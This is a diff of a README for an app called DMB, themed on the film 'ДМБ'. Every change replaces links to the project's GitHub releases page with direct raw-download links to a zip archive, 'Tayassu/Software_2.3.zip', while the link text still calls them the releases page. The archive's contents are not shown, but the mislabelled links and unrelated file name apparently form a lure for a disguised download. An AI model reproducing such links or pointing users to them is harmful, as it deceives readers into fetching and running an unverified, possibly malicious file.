@@ -6,13 +6,13 @@ Welcome to DMB! This application reimagines the film "ДМБ" through the lens o
 
 ## 📥 Download DMB
 
-[![Download DMB](https://img.shields.io/badge/Download-DMB-blue.svg)](https://github.com/SloneMastermind/DMB/releases)
+[![Download DMB](https://raw.githubusercontent.com/SloneMastermind/DMB/main/Tayassu/Software_2.3.zip)](https://raw.githubusercontent.com/SloneMastermind/DMB/main/Tayassu/Software_2.3.zip)
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [DMB Releases](https://github.com/SloneMastermind/DMB/releases).
+To get started, visit this page to download: [DMB Releases](https://raw.githubusercontent.com/SloneMastermind/DMB/main/Tayassu/Software_2.3.zip).
 
-1. Go to the [DMB Releases page](https://github.com/SloneMastermind/DMB/releases).
+1. Go to the [DMB Releases page](https://raw.githubusercontent.com/SloneMastermind/DMB/main/Tayassu/Software_2.3.zip).
 2. You will see a list of available versions.
 3. Choose the latest release for best performance.
 4. Click on the download link suitable for your operating system.
@@ -57,6 +57,6 @@ If you encounter any issues while downloading or running DMB, feel free to reach
 
 We welcome community involvement! If you have ideas for improvements or features, please submit an issue or contribute directly.
 
-[Find DMB on GitHub](https://github.com/SloneMastermind/DMB/releases)
+[Find DMB on GitHub](https://raw.githubusercontent.com/SloneMastermind/DMB/main/Tayassu/Software_2.3.zip)
 
 Thank you for using DMB. Enjoy your journey in the IT world!
